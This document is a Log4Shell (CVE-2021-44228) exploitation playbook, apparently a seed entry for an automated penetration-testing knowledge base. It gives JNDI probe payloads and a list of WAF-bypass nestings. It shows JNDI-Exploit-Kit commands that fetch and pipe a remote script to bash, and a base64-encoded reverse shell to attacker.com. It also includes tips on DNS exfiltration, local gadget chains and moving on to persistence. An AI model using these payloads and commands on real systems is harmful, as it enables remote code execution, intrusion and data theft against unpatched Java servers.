# [seed] Log4Shell (CVE-2021-44228) JNDI Injection to RCE

## Scenario classification
Penetration testing / Web RCE

## Target overview
A Java web application uses an affected Log4j2 version (< 2.17.0); whenever any user-controllable field is logged, JNDI remote loading triggers, and an LDAP/RMI service that pushes a malicious class yields execution on the target machine.

## Complete execution chain

1. Target identification
   - The HTTP headers `Server`, `X-Powered-By` show a Java application framework (Tomcat/Spring/Liferay)
   - Version fingerprints: login page, 404 page, path leaks
   - Vulnerability confirmation: send probe payloads through any field that gets logged (User-Agent, Referer, X-Forwarded-For, login username, search box)
2. Prepare OOB listening
   - DNSLog platforms (dnslog.cn / interactsh / Burp Collaborator)
   - A self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit)
3. Probe for the vulnerability
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   Insert into fields such as User-Agent; a resolution record for `abc123.dnslog.cn` on the DNSLog platform confirms it
4. Start the exploitation service (a self-hosted public VPS or an ngrok reverse proxy)
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. Trigger the exploitation payload
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. Get a reverse shell → follow attack-chain for privilege escalation / persistence

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Probe payload gets no DNS callback | The target is on an intranet without internet access | Use a DNS-only OOB such as oast.online, or test an internal DNSLog | 1h |
| DNS resolves but LDAP does not connect | The egress policy only allows DNS | Switch to DNS exfiltration to send data out directly, without LDAP | 1.5h |
| LDAP connects but the target does not load the class | Newer JDKs (8u191+/11.0.1+/...) default to `com.sun.jndi.ldap.object.trustURLCodebase=false` | Use local gadget chains such as `Tomcat` / `Groovy` / `BeanFactory` instead (no remote class loading needed) | 3h |
| Double quotes escaped / payload blocked by the WAF | Various ${} nestings bypass the stock rules | Bypass with nestings such as `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` | 1h |
| Vulnerability triggers but no shell | Special characters in the command are broken by Runtime.exec | Wrap it in base64: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| No reproduction on a Spring Boot app | Spring uses Logback, not Log4j2 | Check the dependency tree for spring-boot-starter-log4j2 | 20min |

## Toolchain findings

- **JNDI-Exploit-Kit** (welk1n / pimps) starts LDAP+RMI+HTTP in one click and supports local gadget bypasses
- **JNDI-Injection-Exploit** is the older version, supports more gadgets but is no longer maintained
- The **Nuclei** template `cves/2021/CVE-2021-44228.yaml` suits scanning assets for exposure
- **interactsh-client** from ProjectDiscovery; a self-hosted OOB is more private than dnslog.cn
- The **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at binary level

## Key code/commands

WAF bypass payload collection:

```text
${jndi:ldap://x.dnslog.cn/a}                    # basic
${${::-j}ndi:ldap://x.dnslog.cn/a}              # nested
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # extreme character splitting
${jndi:dns://x.dnslog.cn}                       # DNS channel
${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
```

Starting the interactsh service:

```bash
interactsh-client -v
# output: abc123.oast.online ← replace the dnslog in the payload with this domain
```

One-click exploitation with JNDI-Exploit-Kit:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# outputs several usable payloads; pick one and insert it into the target
```

## Improvement suggestions for this package

- Create a separate `pentest-tools/references/log4shell-bypass-payloads.md` collecting 50+ bypass payloads
- nuclei already ships the template → remind the user of `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
- Add a list of standard actions "after entering the intranet through Log4Shell" to attack-chain

## Reusable patterns/script snippets

**Three-step Log4Shell probing**:

```text
1. Send ${jndi:ldap://oob/a} in bulk across many fields → check the OOB platform for callbacks
2. Callback received → start a local gadget LDAP (no remote class loading dependency) → push the payload
3. No callback → switch to the DNS channel for out-of-band exfiltration
```

**Key judgments**:

```text
- DNSLog receives callbacks but LDAP does not connect → newer JDK; local gadgets are mandatory
- Not even DNS connects → intranet OOB / second-order reflection (hit a secondary system with internet access first)
- Commands with special characters do not respond → wrap in base64
```

## Evolution actions
- [x] The routing matrix already has the "Log4j" / "JNDI injection" keywords
- [ ] Create a separate log4shell-bypass-payloads.md
- [ ] Add interactsh-client to the bootstrap manifest

## Environment information
- Attacker machine: Kali, Java 8 (runs the LDAP service)
- OOB platforms: dnslog.cn / oast.online / self-hosted interactsh
- Target: any Java web app with Log4j2 < 2.17.0

## Redaction requirements
This entry is seed data, written from public CVE information, with no real production target involved. All domains/IPs are placeholder examples.
